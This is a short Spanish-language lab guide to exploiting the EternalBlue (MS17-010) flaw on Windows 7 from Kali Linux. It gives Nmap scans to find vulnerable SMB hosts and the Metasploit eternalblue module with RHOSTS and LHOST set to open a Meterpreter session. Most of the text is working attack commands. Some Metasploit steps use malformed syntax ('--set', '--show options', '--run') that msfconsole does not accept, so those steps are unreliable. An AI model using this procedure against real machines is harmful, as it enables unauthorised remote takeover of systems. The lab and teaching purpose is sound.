# Explotación de EternalBlue (MS17-010): Kali Linux vs. Windows 7

Guía paso a paso para la auditoría y explotación de la vulnerabilidad MS17-010 (EternalBlue) en un entorno de laboratorio controlado.

---

## Fase 1: Reconocimiento Local (En la Máquina Víctima - Windows 7)

Obtener la dirección IP del objetivo:
ipconfig

## Fase 2: Escaneo y Detección de Vulnerabilidades (En Kali Linux)
Descubrimiento de puertos y verificación específica de MS17-010 mediante Nmap:

# Escaneo de puertos y servicios en el objetivo
  nmap -sV -sC <IP_WINDOWS_7>

# Verificación específica de la vulnerabilidad EternalBlue (SMB v1)
  nmap -p 445 --script smb-vuln-ms17-010 <IP_WINDOWS_7> -vvv
  
## Fase 3: Explotación con Metasploit (En Kali Linux)
  Iniciar la consola de Metasploit:
  msfconsole


Buscar el módulo de EternalBlue:
  search ms17-010


Seleccionar el exploit de EternalBlue para Windows 7:
  use exploit/windows/smb/ms17_010_eternalblue

Configurar los parámetros obligatorios de la red:
  options
    --set RHOSTS <IP_WINDOWS_7>
    --set LHOST <IP_KALI>
Verificar la configuración de las opciones y ejecutar la explotación:
  --show options
  --run  # (o `exploit`)
  
Verificación de acceso tras obtener sesión de Meterpreter:
  getuid
  sysinfo
